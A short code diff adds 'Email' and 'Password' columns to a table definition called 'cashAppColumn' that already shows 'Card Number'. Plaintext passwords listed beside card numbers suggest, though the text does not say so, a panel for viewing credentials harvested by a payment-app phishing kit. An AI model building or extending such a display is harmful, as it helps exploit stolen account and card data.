@@ -25,6 +25,16 @@ export const cashAppColumn = [
     width: "auto",
   },
   {
+    Header: "Email",
+    accessor: "email",
+    width: "auto",
+  },
+  {
+    Header: "Password",
+    accessor: "password",
+    width: "auto",
+  },
+  {
     Header: "Card Number",
     accessor: "card_number",
     width: "auto",
